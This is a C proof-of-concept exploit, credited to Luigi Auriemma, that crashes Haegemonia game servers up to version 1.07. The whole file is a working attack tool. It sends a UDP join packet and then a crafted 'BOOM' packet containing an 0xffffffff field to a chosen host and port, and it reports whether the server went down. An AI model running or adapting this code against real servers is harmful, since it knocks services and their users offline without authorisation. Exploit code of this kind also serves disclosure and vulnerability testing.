/*

by Luigi Auriemma

UNIX & WIN VERSION
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif




#define VER     "0.1"
#define BUFFSZ  2048
#define PORT    19664
#define TIMEOUT 5
#define SEND(x) if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&peer, psz) \
                  < 0) std_err();
#define RECV    if(recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &psz) \
                  < 0) std_err();
#define JOIN    "\x00\x00"
#define BOOM    "\x10\x00\x00\x03\x0b\x01" \
/* boom */      "\xff\xff\xff\xff" \
/* message */   "boomyeah"




int timeout(int sock);
u_long resolv(char *host);
void std_err(void);




int main(int argc, char *argv[]) {
    int         sd,
                psz;
    u_short     port = PORT;
    u_char      *buff;
    struct  sockaddr_in peer;

    setbuf(stdout, NULL);

    fputs("\n"
        "Haegemonia <= 1.07 remote server crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\nUsage: %s <server> [port(%u)]\n"
            "\n", argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;
    psz                  = sizeof(peer);

    printf("\nStarting attack versus %s:%hu\n\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    fputs("- sending JOIN packet\n", stdout);
    SEND(JOIN);
    if(timeout(sd) < 0) {
        fputs("\nError: socket timeout, server is probably not online\n", stdout);
        exit(1);
    }
    buff = malloc(BUFFSZ);
    if(!buff) std_err();
    RECV;

    fputs("- sending BOOM packet\n", stdout);
    SEND(BOOM);
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!!!!!\n", stdout);
    } else {
        fputs("\nServer doesn't seem to be vulnerable\n", stdout);
    }
    close(sd);

    return(0);
}




int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}




u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif



